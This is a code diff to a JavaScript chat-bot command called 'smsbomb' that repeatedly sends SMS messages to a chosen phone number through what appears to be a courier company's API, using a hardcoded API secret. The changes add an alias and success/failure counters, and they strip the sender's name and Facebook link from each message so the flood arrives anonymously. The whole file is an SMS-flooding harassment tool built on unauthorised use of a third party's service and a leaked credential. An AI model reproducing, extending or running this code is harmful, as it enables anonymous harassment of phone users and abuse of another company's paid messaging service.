@@ -3,7 +3,7 @@ const axios = require('axios');
 module.exports["config"] = {
     name: "smsbomb",
     aliases: ["smsspam",
-        "spamsms"],
+        "spamsms", "smsb"],
     isPrefix: false,
     version: "1.1.0",
     credits: "Kenneth Panio",
@@ -60,6 +60,8 @@ module.exports["run"] = async ({
         return randomMessage;
     };
 
+    let successCount = 0;
+    let failCount = 0;
 
     try {
         // Step 1: Generate JWT
@@ -123,7 +125,7 @@ module.exports["run"] = async ({
                 `${gateway}/lexaapi/lexav1/api/AddDefaultDisbursement`,
                 {
                     Recipient: "63" + number,
-                    Message: `FROM: ${await chat.userName(event.senderID)}\nFB: https://facebook.com/${event.senderID}\nMESSAGE: ${randomMessage}\n\n\nFREE SMS @LBCEXPRESS.`,
+                    Message: randomMessage,
                     ShipperUuid: "LBCEXPRESS",
                     DefaultDisbursement: 3,
                     ApiSecret: "03da764a333680d6ebd2f6f4ef1e2928",
@@ -154,11 +156,13 @@ module.exports["run"] = async ({
             );
 
             if (smsResponse.data.status === "ok") {
-                await chat.reply(mono(`✅ SMS BOMB successfully (${i + 1}/${times})!`));
+                successCount++;
             } else {
-                await chat.reply(mono(`❌ Failed to send SMS BOMB (${i + 1}/${times}). Response: ${JSON.stringify(smsResponse.data)}`));
+                failCount++;
             }
         }
+
+        await chat.reply(mono(`✅ SMS BOMB complete! Sent: ${successCount} success, ${failCount} failed.`));
     } catch (error) {
         let errorMessage = "❌ ERROR: ";
 
